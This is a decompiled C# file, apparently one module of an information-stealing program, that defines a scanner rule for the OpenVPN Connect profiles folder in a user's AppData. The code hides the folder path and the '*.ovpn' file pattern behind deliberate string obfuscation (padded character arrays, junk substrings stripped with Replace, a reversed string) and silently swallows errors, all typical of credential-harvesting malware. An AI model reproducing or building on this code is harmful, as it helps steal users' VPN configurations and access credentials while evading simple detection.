using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

// Token: 0x02000021 RID: 33
public class OpenVPNRule : FileScannerRule
{
	// Token: 0x06000083 RID: 131 RVA: 0x000059B3 File Offset: 0x00003BB3
	public override string GetFolder(FileScannerArg scannerArg, FileInfo fileInfo)
	{
		return string.Empty;
	}

	// Token: 0x06000084 RID: 132 RVA: 0x00006184 File Offset: 0x00004384
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			list.Add(new FileScannerArg
			{
				Directory = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPFile.WriteROFILE%\\AppFile.WriteData\\RoamiFile.Writeng").Replace("File.Write", string.Empty), new string(new char[]
				{
					'O',
					'p',
					'H',
					'a',
					'n',
					'd',
					'l',
					'e',
					'r',
					'e',
					'n',
					'V',
					'P',
					'H',
					'a',
					'n',
					'd',
					'l',
					'e',
					'r',
					'N',
					' ',
					'C',
					'o',
					'n',
					'H',
					'a',
					'n',
					'd',
					'l',
					'e',
					'r',
					'n',
					'e',
					'c',
					't'
				}).Replace("Handler", string.Empty) + "\\" + new string(new char[]
				{
					'p',
					'r',
					'o',
					'f',
					'i',
					'l',
					'e',
					's'
				})),
				Pattern = new string("npvo*".Reverse<char>().ToArray<char>()),
				Recoursive = false
			});
		}
		catch
		{
		}
		return list;
	}
}
